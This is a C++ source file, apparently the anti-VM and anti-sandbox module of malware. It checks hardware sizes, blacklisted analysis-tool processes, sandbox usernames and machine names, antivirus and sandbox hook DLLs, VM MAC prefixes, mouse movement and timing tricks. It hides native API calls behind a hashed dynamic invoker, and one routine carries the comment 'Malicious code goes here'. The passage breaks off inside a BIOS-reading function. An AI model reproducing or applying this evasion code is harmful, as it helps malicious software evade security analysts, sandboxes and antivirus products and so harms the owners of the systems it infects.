#include "AntiVm.h"
#include <powerbase.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <comdef.h>
#include <wbemcli.h>
#include <intrin.h>
#include <cstring>
#include <vector>
#include <regex>
#include <d3d11.h>
#include <dxgi.h>
#include <iphlpapi.h>
#include "definition.h"
#include "Tools.h"
#include "Function.hpp"


#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")



static auto& dynamicInvoker = DynamicInvoker::get_instance();

typedef void (WINAPI* pRtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

typedef NTSTATUS(NTAPI* pZwQueryLicenseValue)(
    PUNICODE_STRING ValueName,
    ULONG* Type,
    PVOID Data,
    ULONG DataSize,
    ULONG* ResultDataSize);


typedef NTSTATUS(NTAPI* pNtDelayExecution)(
    IN BOOLEAN              Alertable,
    IN PLARGE_INTEGER       DelayInterval);


/*
通过SystemBasicInformation检测CPU核心数
*/
BOOLEAN checkCPUCoreNum() {
    
    SYSTEM_BASIC_INFORMATION sbi = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemBasicInformation, &sbi, sizeof(SYSTEM_BASIC_INFORMATION), &size);
    
    if (sbi.NumberOfProcessors < 4) {
        return TRUE;
    }
    return FALSE;
}
/*
通过 SystemMemoryUsageInformation 检测物理内存大小 (以 GB 为单位)
*/
BOOLEAN checkPhysicalMemory() {
    SYSTEM_MEMORY_USAGE_INFORMATION smui = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemMemoryUsageInformation, &smui, sizeof(SYSTEM_MEMORY_USAGE_INFORMATION), &size);
    return (smui.TotalPhysicalBytes / (1024*1024*1024)) < 4;
}
/*
通过 DeviceIoControl 获取系统总磁盘大小 需要管理员权限
*/
BOOLEAN checkTotalDiskSize()
{
    INT disk = 256 * 0.9;
    HANDLE hDrive;
    GET_LENGTH_INFORMATION size;
    DWORD lpBytes;

    // 打开物理磁盘
    hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    // 获取磁盘大小信息
    BOOLEAN result = DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytes, NULL);
    CloseHandle(hDrive);

    // 判断磁盘大小是否小于给定值 转GB
    return (size.Length.QuadPart / 1073741824) < disk;
}

BOOLEAN checkProcess()
{
    // 使用 std::vector 来存储进程名
    std::vector<std::string> list = { "VBoxService.exe", "VBoxTray.exe", "vmware.exe", "vmtoolsd.exe","qemu","fiddler","process explorer","ida","olldbg","x64dbg","x32dbg","Detonate" };    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);

    // 创建进程快照
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);


    BOOLEAN bResult = Process32First(hProcessSnap, &pe32);
    while (bResult) {
        char sz_Name[MAX_PATH] = { 0 };

        WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, sz_Name, sizeof(sz_Name), NULL, NULL);

        for (size_t i = 0; i < list.size(); ++i) {
            if (strcmp(sz_Name, list[i].c_str()) == 0) {
                CloseHandle(hProcessSnap);
                return TRUE;
            }
        }
        bResult = Process32Next(hProcessSnap, &pe32);
    }

    CloseHandle(hProcessSnap);
    return FALSE;
}

BOOLEAN ManageWMIInfo(std::string& result, const std::string& table, const std::wstring& wcol)
{
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        return FALSE; // 初始化 COM 库失败
    }

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE; // 创建 WMI Locator 实例失败
    }

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),  // WMI 命名空间
        NULL,  // 用户名，NULL 表示当前用户
        NULL,  // 用户密码，NULL 表示当前密码
        0,     // 本地化
        NULL,  // 安全标志
        0,     // 权限
        0,     // 上下文对象
        &pSvc  // 返回的 IWbemServices 接口
    );
    pLoc->Release();
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE; // 连接 WMI 服务器失败
    }

    // 设置代理空白标记
    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );
    if (FAILED(hres)) {
        pSvc->Release();
        CoUninitialize();
        return FALSE; // 设置代理失败
    }

    // 执行 WMI 查询
    IEnumWbemClassObject* pEnumerator = NULL;
    std::string query = "SELECT * FROM " + table;
    hres = pSvc->ExecQuery(
        bstr_t("WQL"),
        bstr_t(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator
    );
    if (FAILED(hres)) {
        pSvc->Release();
        CoUninitialize();
        return FALSE; // 执行查询失败
    }

    IWbemClassObject* pclsObj;
    ULONG uReturn = 0;
    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
        if (0 == uReturn) {
            break; // 没有更多数据
        }

        VARIANT vtProp;
        VariantInit(&vtProp);
        hr = pclsObj->Get(wcol.c_str(), 0, &vtProp, 0, 0);
        if (SUCCEEDED(hr)) {
            _bstr_t bstrValue(vtProp.bstrVal);
            result = (const char*)bstrValue; // 将获取到的 BSTR 转换为 std::string
        }
        VariantClear(&vtProp);
        pclsObj->Release();
    }

    // 清理
    pSvc->Release();
    pEnumerator->Release();
    CoUninitialize();

    return !result.empty(); // 返回是否成功获取到结果
}

BOOLEAN checkHardwareInfo()
{
    // 先获取主板序列号
    std::string ret;
    ManageWMIInfo(ret, "Win32_BaseBoard", L"SerialNumber");
    if (ret == "None") {
        return TRUE; // 如果没有获取到序列号，认为是虚拟机环境
    }

    // 获取磁盘信息，检查是否包含虚拟机标志
    ManageWMIInfo(ret, "Win32_DiskDrive", L"Caption");
    if (ret.find("VMware") != std::string::npos || ret.find("VBOX") != std::string::npos || ret.find("Virtual HD") != std::string::npos) {
        return TRUE; // 如果磁盘信息包含虚拟机相关关键词，则为虚拟机环境
    }

    // 获取计算机型号，检查是否包含虚拟机标志
    ManageWMIInfo(ret, "Win32_ComputerSystem", L"Model");
    if (ret.find("VMware") != std::string::npos || ret.find("VirtualBox") != std::string::npos || ret.find("Virtual Machine") != std::string::npos) {
        return TRUE; // 如果计算机型号包含虚拟机相关关键词，则为虚拟机环境
    }

    // 如果所有检查都未检测到虚拟机标志，返回 FALSE
    return FALSE;
}

BOOLEAN checkBootTime()
{
    // 获取系统启动时间（单位：分） 
    ULONG64 uptime = AR_getTickcount64() / 1000 / 60;

    return uptime < 30;
}

BOOLEAN checkHyperVPresent() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x1);  // 获取 CPUID 信息，0x1 表示获取 CPU 信息
    return (cpuInfo[2] & (1 << 31)) != 0;  // 检查 HYPERV_HYPERVISOR_PRESENT_BIT（第31位）
}

BOOLEAN checkTempFileCount(INT reqFileCount)
{
    int fileCount = 0;
    DWORD dwRet;
    LPSTR pszOldVal = (LPSTR)malloc(MAX_PATH * sizeof(char));

    // 从环境变量获取 TEMP 目录路径
    dwRet = GetEnvironmentVariableA("TEMP", pszOldVal, MAX_PATH);
    if (dwRet == 0 || dwRet > MAX_PATH) {
        free(pszOldVal);
        return FALSE;
    }

    std::string tempDir = pszOldVal;
    tempDir += "\\*";
    free(pszOldVal);  // 释放分配的内存

    WIN32_FIND_DATAA data;
    HANDLE hFind = FindFirstFileA(tempDir.c_str(), &data);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        // 跳过目录 `.` 和 `..`
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) {
            continue;
        }

        // 仅统计文件，排除子目录
        if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            fileCount++;
            if (fileCount >= reqFileCount) {
                FindClose(hFind);
                return FALSE;
            }
        }

    } while (FindNextFileA(hFind, &data) != 0);

    FindClose(hFind);  // 关闭句柄

    // 如果文件数量小于指定值，返回 TRUE
    return TRUE;
}

BOOLEAN checkCPUTemperature()
{
    HRESULT hres;
    BOOLEAN res = -1;

    do
    {
        // Step 1: --------------------------------------------------
    // Initialize COM. ------------------------------------------

        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres))
        {
            // cout << "Failed to initialize COM library. Error code = 0x" << hex << hres << endl;
            break;                  // Program has failed.
        }

        // Step 2: --------------------------------------------------
        // Set general COM security levels --------------------------

        hres = CoInitializeSecurity(
            NULL,
            -1,                          // COM authentication
            NULL,                        // Authentication services
            NULL,                        // Reserved
            RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
            RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
            NULL,                        // Authentication info
            EOAC_NONE,                   // Additional capabilities 
            NULL                         // Reserved
        );

        if (FAILED(hres))
        {
            // cout << "Failed to initialize security. Error code = 0x" << hex << hres << endl;
            CoUninitialize();
            break;                    // Program has failed.
        }

        // Step 3: ---------------------------------------------------
        // Obtain the initial locator to WMI -------------------------

        IWbemLocator* pLoc = NULL;

        hres = CoCreateInstance(
            CLSID_WbemLocator,
            0,
            CLSCTX_INPROC_SERVER,
            IID_IWbemLocator, (LPVOID*)&pLoc);

        if (FAILED(hres))
        {
            // cout << "Failed to create IWbemLocator object." << " Err code = 0x" << hex << hres << endl;
            CoUninitialize();
            break;                 // Program has failed.
        }

        // Step 4: -----------------------------------------------------
        // Connect to WMI through the IWbemLocator::ConnectServer method

        IWbemServices* pSvc = NULL;

        // Connect to the root\cimv2 namespace with
        // the current user and obtain pointer pSvc
        // to make IWbemServices calls.
        hres = pLoc->ConnectServer(
            // _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
            _bstr_t(L"ROOT\\WMI"),
            NULL,                    // User name. NULL = current user
            NULL,                    // User password. NULL = current
            0,                       // Locale. NULL indicates current
            NULL,                    // Security flags.
            0,                       // Authority (for example, Kerberos)
            0,                       // Context object 
            &pSvc                    // pointer to IWbemServices proxy
        );

        if (FAILED(hres))
        {
            // cout << "Could not connect. Error code = 0x" << hex << hres << endl;
            pLoc->Release();
            CoUninitialize();
            break;                // Program has failed.
        }

        // cout << "Connected to ROOT\\WMI WMI namespace" << endl;

        // Step 5: --------------------------------------------------
        // Set security levels on the proxy -------------------------

        hres = CoSetProxyBlanket(
            pSvc,                        // Indicates the proxy to set
            RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
            RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
            NULL,                        // Server principal name 
            RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
            RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
            NULL,                        // client identity
            EOAC_NONE                    // proxy capabilities 
        );

        if (FAILED(hres))
        {
            // cout << "Could not set proxy blanket. Error code = 0x" << hex << hres << endl;
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            break;               // Program has failed.
        }

        // Step 6: --------------------------------------------------
        // Use the IWbemServices pointer to make requests of WMI ----

        // For example, get the name of the operating system
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery(
            bstr_t("WQL"),
            bstr_t("SELECT * FROM MSAcpi_ThermalZoneTemperature"),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL,
            &pEnumerator);

        if (FAILED(hres))
        {
            // cout << "Query for operating system name failed." << " Error code = 0x" << hex << hres << endl;
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            break;               // Program has failed.
        }

        // Step 7: -------------------------------------------------
        // Get the data from the query in step 6 -------------------

        IWbemClassObject* pclsObj = NULL;
        ULONG uReturn = 0;

        while (pEnumerator)
        {
            HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

            if (0 == uReturn) // VM中结果为空
            {
                if (-1 == res)
                {
                    res = TRUE;
                }
                break;
            }

            VARIANT vtProp;

            // Get the value of the Name property
            hr = pclsObj->Get(L"CurrentTemperature", 0, &vtProp, 0, 0);
            // res = vtProp.ullVal / 10.0 - 273.15; // 开氏转摄氏
            //std::cout << vtProp.ullVal / 10.0 - 273.15 << std::endl;
            res = FALSE;

            VariantClear(&vtProp);

            pclsObj->Release();
        }

        // Cleanup
        // ========

        pSvc->Release();
        pLoc->Release();
        pEnumerator->Release();
        CoUninitialize();

    } while (false);

    return res;
}

BOOLEAN checkGPUMemory() {
    // 初始化设备和设备上下文
    D3D_FEATURE_LEVEL featureLevel;
    ID3D11Device* device = nullptr;
    ID3D11DeviceContext* context = nullptr;

    HRESULT hr = D3D11CreateDevice(
        nullptr,                   // 使用默认适配器
        D3D_DRIVER_TYPE_HARDWARE,  // 使用硬件驱动
        nullptr,                   // 不使用软件驱动
        0,                         // 无调试标志
        nullptr, 0,                // 默认特性级别
        D3D11_SDK_VERSION,         // SDK 版本
        &device,                   // 返回设备指针
        &featureLevel,             // 返回特性级别
        &context                   // 返回设备上下文
    );

    if (FAILED(hr)) {
        std::cerr << "Failed to create D3D11 device." << std::endl;
        return FALSE;
    }

    // 创建 DXGI Factory
    IDXGIFactory* dxgiFactory = nullptr;
    hr = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&dxgiFactory);
    if (FAILED(hr)) {
        std::cerr << "Failed to create DXGI factory." << std::endl;
        device->Release();
        return FALSE;
    }

    // 枚举所有显卡适配器
    IDXGIAdapter* adapter = nullptr;
    UINT adapterIndex = 0;
    BOOLEAN lowMemoryGPU = TRUE;  // 默认假设所有显卡都属于 low memory

    while (dxgiFactory->EnumAdapters(adapterIndex, &adapter) != DXGI_ERROR_NOT_FOUND) {
        // 获取显卡描述
        DXGI_ADAPTER_DESC adapterDesc;
        hr = adapter->GetDesc(&adapterDesc);
        if (FAILED(hr)) {
            adapter->Release();
            break;
        }

        //std::wcout << L"GPU Name: " << adapterDesc.Description << std::endl;
        //std::wcout << L"Dedicated Video Memory: " << adapterDesc.DedicatedVideoMemory / 1024 / 1024 << L" MB" << std::endl;

        // 如果显卡显存大于0.5GB，则认为该显卡不是低显存
        if ((adapterDesc.DedicatedVideoMemory / 1024 / 1024) > 512) {
            lowMemoryGPU = FALSE;  // 至少有一张显卡显存大于0.5GB，标记为非low
        }

        adapter->Release();
        adapterIndex++;
    }

    // 清理资源
    dxgiFactory->Release();
    device->Release();

    return lowMemoryGPU;
}

BOOLEAN checkMacAddrPrefix() {

    const std::vector<std::string>& macPrefixes = { "08-00-27", "00-03-FF", "00-05-69", "00-0C-29", "00-50-56" };
    PIP_ADAPTER_INFO pIpAdapterInfo = nullptr;
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);

    if (nRel == ERROR_BUFFER_OVERFLOW) {
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }

    if (nRel != ERROR_SUCCESS) {
        // std::cerr << "Error getting adapter info." << std::endl;
        return false;
    }

    bool foundMatchingPrefix = false;

    // 遍历所有网卡
    while (pIpAdapterInfo) {

        // 检查是否匹配任何预设的MAC前缀
        for (const auto& prefix : macPrefixes) {
            // 提取前缀部分
            std::string macPrefix = prefix;
            macPrefix.erase(std::remove(macPrefix.begin(), macPrefix.end(), '-'), macPrefix.end());  // 去除"-"

            // 提取前3个字节，转换成一个字符数组
            if (macPrefix.length() != 6) {
                continue;  // 前缀必须是6个字符（每个字节的两个十六进制字符）
            }

            unsigned char prefixBytes[3];
            for (int i = 0; i < 3; ++i) {
                prefixBytes[i] = std::stoi(macPrefix.substr(i * 2, 2), nullptr, 16);
            }

            // 如果前缀匹配
            if (!memcmp(prefixBytes, pIpAdapterInfo->Address, 3)) {
                // std::cout << "Matched prefix: " << prefix << std::endl;
                foundMatchingPrefix = true;
                break;
            }
        }


        pIpAdapterInfo = pIpAdapterInfo->Next;
    }

    if (pIpAdapterInfo) {
        delete[] pIpAdapterInfo;
    }

    return foundMatchingPrefix;
}

BOOLEAN caseInsensitiveCompare(const std::string& str1, const std::string& str2) {
    if (str1.size() != str2.size()) return false;

    return std::equal(str1.begin(), str1.end(), str2.begin(),
        [](char c1, char c2) {
            return std::tolower(c1) == std::tolower(c2);
        });
}

BOOLEAN checkUsernames() {
    // 获取用户名
    DWORD size = 256;
    char username[256];
    GetUserNameA(username, &size);

    // 黑名单
    std::vector<std::string> usernames = {
        "CurrentUser", "Sandbox", "Emily", "HAPUBWS", "Hong Lee", "IT-ADMIN", "Johnson",
        "Miller", "milozs", "Peter Wilson", "timmy", "user", "sand box", "malware",
        "maltest", "test user", "virus", "John Doe", "Sangfor", "JOHN-PC"
    };

    std::string currentUsername(username);
    // std:: cout << currentUsername << std::endl;
    for (const auto& knownUsername : usernames) {
        // 大小写不敏感的比较
        if (caseInsensitiveCompare(currentUsername, knownUsername)) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOLEAN checkNetBIOS() {
    // 获取计算机的 NetBIOS 名称
    CHAR szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD dwSize = sizeof(szComputerName) / sizeof(szComputerName[0]);
    GetComputerNameA(szComputerName, &dwSize);

    std::string netbiosName(szComputerName);
    if (netbiosName.empty()) {
        return FALSE; // 获取 NetBIOS 名称失败
    }

    // 已知的 NetBIOS 名称列表（模拟的沙箱检测）
    std::vector<std::string> netbiosNames = {
        "SANDBOX", "7SILVIA", "HANSPETER-PC", "JOHN-PC", "MUELLER-PC", "WIN7 - TRAPS", "FORTINET","TEQUILABOOMBOOM"
    };

    // 遍历已知名称列表，进行比较
    for (const auto& knownNetbiosName : netbiosNames) {
        if (caseInsensitiveCompare(netbiosName, knownNetbiosName)) {
            return TRUE;
        }
    }

    return FALSE;
}

std::wstring getParentProcessName() {
    // 获取当前进程的进程ID
    DWORD currentProcessId = GetCurrentProcessId();

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return L"";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 遍历进程列表
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // 找到当前进程的父进程
            if (pe32.th32ProcessID == currentProcessId) {
                DWORD parentProcessId = pe32.th32ParentProcessID;

                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        if (pe32.th32ProcessID == parentProcessId) {
                            std::wstring parentProcessName = pe32.szExeFile;
                            CloseHandle(hSnapshot);
                            return parentProcessName;
                        }
                    } while (Process32Next(hSnapshot, &pe32));
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return L"";
}

BOOLEAN isParentRundll32() {
    std::wstring parentProcessName = getParentProcessName();
    if (!parentProcessName.empty()) {
        // 判断父进程是否是 rundll32.exe
        if (_wcsicmp(parentProcessName.c_str(), L"rundll32.exe") == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

BOOLEAN checkCurrentProcessFileName(const std::wstring& targetSubstring) {
    wchar_t path[MAX_PATH];
    // 获取当前进程的可执行文件路径
    DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);
    if (length == 0) {
        std::wcerr << L"Failed to get executable path" << std::endl;
        return false;
    }

    // 获取路径中的文件名部分
    std::wstring executablePath(path);
    size_t pos = executablePath.find_last_of(L"\\");
    if (pos != std::wstring::npos) {
        executablePath = executablePath.substr(pos + 1);  // 提取文件名部分
    }

    // 检查文件名是否包含目标子字符串（不区分大小写）
    return executablePath.find(targetSubstring) == std::wstring::npos;
}

BOOLEAN check_run_path() {
    // 获取当前工作目录
    char buf[256];
    GetCurrentDirectoryA(256, buf);
    std::string workingdir(buf);

    // 如果路径长度小于等于6，直接返回FALSE
    if (workingdir.length() <= 6) {
        return FALSE;
    }

    // 正则表达式用于匹配以 C:\ 开头的路径
    std::regex pattern("^C:\\\\[A-Za-z0-9_]+$");  // 只匹配一级目录
    if (std::regex_match(workingdir, pattern)) {
        // 常见的排除文件夹
        std::vector<std::string> excludeDirs = { "Windows", "ProgramData", "Users" };

        // 获取工作目录的子目录名称（C:\后面的第一个文件夹）
        size_t firstSlash = workingdir.find("\\", 3); // 从 C:\ 后开始查找
        size_t secondSlash = workingdir.find("\\", firstSlash + 1); // 查找第二个反斜杠位置

        std::string firstFolder = workingdir.substr(firstSlash + 1, secondSlash - firstSlash - 1);
        for (const auto& excludeDir : excludeDirs) {
            if (firstFolder == excludeDir) {
                return TRUE;
            }
        }
        return FALSE;
    }

    return FALSE;
}

BOOLEAN checkdlls() {
    // 黑名单 DLL 列表
    std::vector<std::wstring> dlls = {
        L"avghookx.dll",    // AVG
        L"avghooka.dll",    // AVG
        L"snxhk.dll",       // Avast
        L"sbiedll.dll",     // Sandboxie
        L"dbghelp.dll",     // WindBG
        L"api_log.dll",     // iDefense Lab
        L"dir_watch.dll",   // iDefense Lab
        L"pstorec.dll",     // SunBelt Sandbox
        L"vmcheck.dll",     // Virtual PC
        L"wpespy.dll",      // WPE Pro
        L"cmdvrt64.dll",    // Comodo Container
        L"cmdvrt32.dll"     // Comodo Container
    };

    for (const auto& dll : dlls) {
        HMODULE hDll = myLoadLibrary(dll.c_str());
        if (hDll != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOLEAN mouse_movement() {

    POINT positionA = {};
    POINT positionB = {};

    /* Retrieve the position of the mouse cursor, in screen coordinates */
    GetCursorPos(&positionA);

    /* Wait a moment */
    Sleep(5000);

    /* Retrieve the poition gain */
    GetCursorPos(&positionB);

    if ((positionA.x == positionB.x) && (positionA.y == positionB.y))
        /* Probably a sandbox, because mouse position did not change. */
        return TRUE;

    else
        return FALSE;
}

BOOLEAN accelerated_sleep()
{
    DWORD dwStart = 0, dwEnd = 0, dwDiff = 0;
    DWORD dwMillisecondsToSleep = 60 * 1000;

    /* Retrieves the number of milliseconds that have elapsed since the system was started */
    dwStart = AR_getTickcount64();

    /* Let's sleep 1 minute so Sandbox is interested to patch that */
    Sleep(dwMillisecondsToSleep);

    /* Do it again */
    dwEnd = AR_getTickcount64();

    /* If the Sleep function was patched*/
    dwDiff = dwEnd - dwStart;
    if (dwDiff > dwMillisecondsToSleep - 1000) // substracted 1s just to be sure
        return FALSE;
    else
        return TRUE;
}

//std::string httpGet(const std::string& host, const std::string& path) {
//    // 初始化 Winsock
//    WSADATA wsaData;
//    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
//        std::cerr << "WSAStartup failed" << std::endl;
//        return "";
//    }
//
//    // 创建套接字
//    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//    if (sock == INVALID_SOCKET) {
//        std::cerr << "Socket creation failed" << std::endl;
//        WSACleanup();
//        return "";
//    }
//
//    struct addrinfo hints = {}, * result;
//    hints.ai_family = AF_INET;
//    hints.ai_socktype = SOCK_STREAM;
//    if (getaddrinfo(host.c_str(), "80", &hints, &result) != 0) {
//        std::cerr << "Failed to resolve host: " << host << std::endl;
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//
//    if (connect(sock, result->ai_addr, static_cast<int>(result->ai_addrlen)) == SOCKET_ERROR) {
//        std::cerr << "Connection failed" << std::endl;
//        freeaddrinfo(result);
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//    freeaddrinfo(result);
//
//    // 构建 HTTP GET 请求
//    std::string request = "GET " + path + " HTTP/1.1\r\n";
//    request += "Host: " + host + "\r\n";
//    request += "Connection: close\r\n\r\n";
//
//    // 发送请求
//    if (send(sock, request.c_str(), static_cast<int>(request.length()), 0) == SOCKET_ERROR) {
//        std::cerr << "Send failed" << std::endl;
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//
//    // 接收响应
//    char buffer[4096];
//    std::string response;
//    int bytes_received;
//    while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
//        buffer[bytes_received] = '\0';  // 确保字符串结束
//        response += buffer;
//    }
//    if (bytes_received == SOCKET_ERROR) {
//        std::cerr << "Receive failed" << std::endl;
//    }
//
//    // 关闭套接字
//    closesocket(sock);
//    WSACleanup();
//    return response;
//}

BOOLEAN query_license_value()
{

    // pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(L"ntdll.dll")), RtlInitUnicodeString_Hashed);
    // 
    // if (RtlInitUnicodeString == nullptr)
    //     return FALSE;
    // 
    // 
    UNICODE_STRING LicenseValue;
    dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash, &LicenseValue, L"Kernel-VMDetection-Private");
    // RtlInitUnicodeString(&LicenseValue, L"Kernel-VMDetection-Private");

    ULONG Result = 0, ReturnLength;

    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQueryLicenseValueStruct.funcAddr, ZwQueryLicenseValueStruct.funcHash,
        &LicenseValue, NULL, reinterpret_cast<PVOID>(&Result), sizeof(ULONG), &ReturnLength);

    // NTSTATUS Status = NtQueryLicenseValue(&LicenseValue, NULL, reinterpret_cast<PVOID>(&Result), sizeof(ULONG), &ReturnLength);

    if (status == 0xC0000034) {
        return FALSE;
    }
    if (NT_SUCCESS(status)) {
        return TRUE;
    }

    return FALSE;

}

#define LODWORD(_qw)    ((DWORD)(_qw))
BOOLEAN rdtsc_diff_locky()
{
    ULONGLONG tsc1;
    ULONGLONG tsc2;
    ULONGLONG tsc3;
    DWORD i = 0;

    // Try this 10 times in case of small fluctuations
    for (i = 0; i < 10; i++)
    {
        tsc1 = __rdtsc();

        // Waste some cycles - should be faster than CloseHandle on bare metal
        GetProcessHeap();

        tsc2 = __rdtsc();

        // Waste some cycles - slightly longer than GetProcessHeap() on bare metal
        CloseHandle(0);

        tsc3 = __rdtsc();

        // Did it take at least 10 times more CPU cycles to perform CloseHandle than it took to perform GetProcessHeap()?
        if ((LODWORD(tsc3) - LODWORD(tsc2)) / (LODWORD(tsc2) - LODWORD(tsc1)) >= 10)
            return FALSE;
    }

    // We consistently saw a small ratio of difference between GetProcessHeap and CloseHandle execution times
    // so we're probably in a VM!
    return TRUE;
}

// sleep
void GetSystemTimeAdjustmentWithDelay() {
    DWORD timeAdjustment = 0;
    DWORD timeIncrement = 0;
    BOOL timeAdjustmentDisabled = FALSE;

    // 调用 GetSystemTimeAdjustment 函数获取时间调整信息
    for (int i = 0; i <= 7814901; i++) {
        GetSystemTimeAdjustment(&timeAdjustment, &timeIncrement, &timeAdjustmentDisabled);
    }
}

/*自实现*/
void custom_sleep(int milliseconds) {
    LARGE_INTEGER frequency;  // 计时器频率
    LARGE_INTEGER start, now;  // 开始时间和当前时间
    double elapsedTime;

    QueryPerformanceFrequency(&frequency);
    // 当前时间
    QueryPerformanceCounter(&start);

    // 等待直到延迟时间过去
    do {
        QueryPerformanceCounter(&now);
        elapsedTime = static_cast<double>(now.QuadPart - start.QuadPart) / frequency.QuadPart * 1000.0;
    } while (elapsedTime < milliseconds);
}

/*WaitForSingleObject*/
BOOLEAN timing_WaitForSingleObject(UINT delayInMillis)
{
    HANDLE hEvent;

    // Create a nonsignaled event
    hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hEvent == NULL)
    {
        return TRUE;
    }

    // Wait until timeout 
    DWORD x = WaitForSingleObject(hEvent, delayInMillis);

    // Malicious code goes here

    return FALSE;
}

/*setTimer*/
BOOLEAN CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
    // This function is called when the timer expires
    return TRUE;
}
BOOLEAN timing_SetTimer(UINT delayInMillis)
{
    // Set a timer that triggers after `delayInMillis` milliseconds
    UINT_PTR timerId = SetTimer(NULL, 0, delayInMillis, (TIMERPROC)TimerProc);

    if (timerId == 0)
    {
        return FALSE;
    }

    // Wait for the timer to trigger (simulate doing something while waiting)
    // We simulate waiting by running a message loop (this is the trick to keep the timer alive)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_TIMER)
        {
            // Timer triggered, handle it
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Kill the timer after it has triggered
    KillTimer(NULL, timerId);

    return TRUE;
}


/*BIOS部分*/
typedef struct _dmi_header {
    BYTE type;
    BYTE length;
    WORD handle;
} dmi_header;
typedef struct _RawSMBIOSData {
    BYTE Used20CallingMethod;
    BYTE SMBIOSMajorVersion;
    BYTE SMBIOSMinorVersion;
    BYTE DmiRevision;
    DWORD Length;
    BYTE SMBIOSTableData[];
} RawSMBIOSData;
const char* dmi_string(const dmi_header* dm, BYTE s) {
    const char* bp = (const char*)dm + dm->length;

